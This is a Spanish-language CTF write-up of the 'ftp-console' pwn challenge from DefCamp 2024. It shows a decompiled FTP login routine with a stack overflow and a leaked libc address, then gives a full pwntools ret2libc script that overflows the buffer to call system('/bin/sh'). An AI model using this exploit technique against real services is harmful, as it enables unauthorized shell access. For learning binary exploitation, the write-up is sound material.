---
layout: post
title: ftp-console DefCamp 2024
comments: true
categories: [Pwn, Writeups, DefCamp]
---

Este es un reto de la competición de CTF DefCamp 2024, organizada por [DefCamp](https://www.linkedin.com/company/defcamp/?originalSubdomain=es). Este fue uno de los 4 retos de la categoría de PWN, de dificulatd "fácil", que por falsos positivos de libc database no pude completar.

![Image]({{ site.baseurl }}/images/posts/2024-10-1-Buy-coffee-DefCamp24-CTF-Logo.png)

# Overview

En este reto nos aprovecharemos de un leak en la Libc para llamar a *system*.

# Reconocimiento

Comenzamos lanzando *checksec*:

```
	Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

Vemos que tenemos arquitectura de 32 bits y prácticamente no hay protecciones. Si descompilamos con *ghidra*, veremos que el código es bastante simple:

```c
int main(void) {
  login();
  return 0;
}

void login() {

  size_t fin_variable;
  int iVar1;
  char password [32];
  char username [32];
  int local_10;
  
  local_10 = 0;
  puts("220 FTP Service Ready");
  printf("USER ");
  fgets(username,0x20,_stdin);
  fin_variable = strcspn(username,"\n");
  username[fin_variable] = '\0';
  puts("331 Username okay, need password.");
  printf("[DEBUG] Password buffer is located at: %lp\n",system);    // Leak de system en libc
  printf("PASS ");
  fgets(password,100,_stdin);                                       // Buffer Overflow
  iVar1 = strcmp(username,"admin");
  if (iVar1 == 0) {
    iVar1 = strcmp(password,"password123\n");
    if (iVar1 == 0) {
      local_10 = 1;
    }
  }
  if (local_10 == 0) {
    puts("530 Login incorrect.");
  }
  else {
    puts("230 User logged in, proceed.");
  }
  return;
}
```

Ignoramos las credenciales que se nos dan ya que al utilizarlas no se imprimirá ninguna flag. Vemos en su lugar que el propio program en una línea de "debug" nos da la dirección de *system* en Libc.

# Explotación

Teniendo dicha dirección, sólo debemos encontrar el offset hasta la dirección base para poder calcular la dirección de una string `"/bin/sh"`. Para ello, debemos capturar el leak del servidor e introducirlo en [libc-database](https://libc.rip/), que nos dirá que la versión es la `./libc6_2.35-0ubuntu3.7_i386.so`, también nos dará el offset hasta `"/bin/sh"`, con lo que podremos construir nuestro script:

```python
#! /bin/python3
# -*- coding: utf-8 -*-

from pwn import *

libc = ELF("./libc6_2.35-0ubuntu3.7_i386.so")

def start():
    if args.REMOTE:
        return remote('34.89.166.46', 30379  )

    else: return process('./ftp_server')
    

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x8048000)
# Stack:      Executable
# RWX:        Has RWX segments
# Stripped:   No

io = start()

io.recvuntil(b"USER ")
io.sendline(b"admin")

io.recvuntil(b"ed at:")
system = io.recvline().strip()
system = int(system, 16)
log.success(f"System {hex(system)}")


libc_base = system - libc.sym["system"]
bin_sh = libc_base + 0x1bd0d5    # Offset hasta "/bin/sh"

log.success(f"Libc {hex(libc_base)}")
log.success(f"bin_sh {hex(bin_sh)}")

io.recvuntil(b"PASS")

payload = b"A"*80
payload += p32(system)
payload += p32(0xdeadbeef)  # Funcion a la que llama "system al salir", puede ser cualquier cosa
payload += p32(bin_sh)

log.info(f"Payload: {payload}")

io.sendline(payload)

io.interactive()
```

Un reto que es sencillo, pero que tras varias respuestas erróneas de las bases de datos de libcs, no pudimos sacar.